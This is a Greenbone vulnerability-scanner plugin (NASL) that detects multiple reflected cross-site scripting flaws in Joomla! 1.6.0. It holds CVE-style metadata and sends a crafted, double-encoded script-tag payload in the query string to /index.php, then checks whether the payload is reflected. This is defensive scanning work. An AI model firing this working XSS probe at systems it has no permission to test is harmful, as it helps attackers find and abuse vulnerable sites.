# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802016");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Joomla! < 1.6.1 Query String Parameter Multiple XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_xref(name:"URL", value:"http://securityreason.com/exploitalert/10169");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Mar/157");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/516982/30/270/threaded");

  script_tag(name:"summary", value:"Joomla is prone to multiple cross-site scripting (XSS)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is caused by an input validation error in the Query
  String Parameter in 'index.php' when processing user-supplied data, which could be exploited by
  attackers to cause arbitrary scripting code to be executed by the user's browser in the security
  context of an affected site.");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to execute arbitrary
  script code in the browser of an unsuspecting user in the context of the affected site.");

  script_tag(name:"affected", value:"Joomla! version 1.6.0 is known to be affected. Older versions
  might be affected as well.");

  script_tag(name:"solution", value:"Upgrade Joomla! version to 1.6.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/index.php/using-joomla/extensions/templates?%27%2522%253E%253Cscript%253Ealert(%252FVT-XSS-Att' +
      'ack-Test%252F)%253C%252Fscript%253E=1';

if (http_vuln_check(port: port, url: url, pattern: '><script>alert(/VT-XSS-Attack-Test/)</script>=1',
                    check_header: TRUE)) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
